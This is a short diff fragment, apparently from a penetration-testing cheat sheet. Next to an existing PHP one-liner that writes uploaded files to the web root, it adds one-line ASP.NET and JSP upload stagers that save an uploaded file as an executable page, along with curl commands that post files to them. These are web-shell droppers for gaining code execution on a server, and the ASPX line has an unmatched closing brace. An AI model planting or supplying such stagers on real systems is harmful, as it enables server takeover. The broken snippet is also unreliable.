@@ -172,6 +172,13 @@ curl -F "f=@/tmp/a.php" http://192.168.1.2/up.php
 <?php copy($_FILES['file']['tmp_name'], './' . $_FILES['file']['name']);
 curl -X POST -H "Content-Type: multipart/form-data" -F "file=@/tmp/a.php" http://192.168.1.2/up.php
 
+<%@ Page Language="C#" %><%if (Request.Files.Count!=0)Request.Files[0].SaveAs(Server.MapPath("./uploadDemo.aspx"));}%>
+curl -X POST -F "file=@path_to_your_file" http://your_server_address/your_aspx_page.aspx
+
+<%@ page import="java.io.*"%><% request.getPart("file").write(getServletContext().getRealPath("/") + "uploadDemo.jsp"); %>
+curl -X POST -F "file=@/path/to/your/file" http://your_server_address/your_upload_page.jsp
+
+
 
 
 <?php
